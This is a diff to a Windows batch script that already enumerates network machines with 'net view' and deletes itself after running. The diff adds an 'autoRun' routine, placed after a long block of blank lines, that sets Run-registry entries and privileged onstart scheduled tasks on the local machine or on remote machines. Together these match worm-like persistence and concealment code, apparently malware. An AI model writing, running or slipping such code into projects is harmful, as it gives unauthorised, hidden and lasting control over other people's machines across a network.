@@ -35,6 +35,8 @@ set module_fileTouch=modules\fileTouch.exe
 set module_shortcut=modules\shortcut.exe
 set module_wget=modules\wget.exe
 
+set autoRun=call :autoRun
+
 set path_startMenu1=%programData%\Microsoft\Windows\Start Menu\Programs
 set path_startMenu2=%appData%\Microsoft\Windows\Start Menu\Programs
 set path_autoRun1=%path_startMenu1%\Startup
@@ -262,3 +264,33 @@ for /f "skip=3 tokens=1,* delims= " %%h in ('net view') do if /i "%%h" NEQ "The"
 
 start /min "" cmd /c "timeout /t 3 && del /q """%~dpnx0""""
 exit
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+:autoRun
+if "%1" == "add" (
+  reg %1 %4HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run             /v "%app_name% %2" /d %3 /f
+  reg %1 %4HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run             /v "%app_name% %2" /d %3 /f
+  reg %1 %4HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run /v "%app_name% %2" /d %3 /f
+  if "%4" == "" ( schtasks /create /sc onstart /tn "%app_name% %2" /tr %3 /f /rl highest
+  ) else for /f "delims=\" %%z in ("%4") do schtasks /create /s %%z /sc onstart /tn "%app_name% %2" /tr %3 /f /rl highest
+) else (
+  reg %1 %3HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run             /v "%app_name% %2" /f
+  reg %1 %3HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run             /v "%app_name% %2" /f
+  reg %1 %3HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run /v "%app_name% %2" /f
+  if "%3" == "" ( schtasks /delete /tn "%app_name% %2" /f
+  ) else for /f "delims=\" %%z in ("%3") do schtasks /delete /s %%z /tn "%app_name% %2" /f
+)
+exit /b
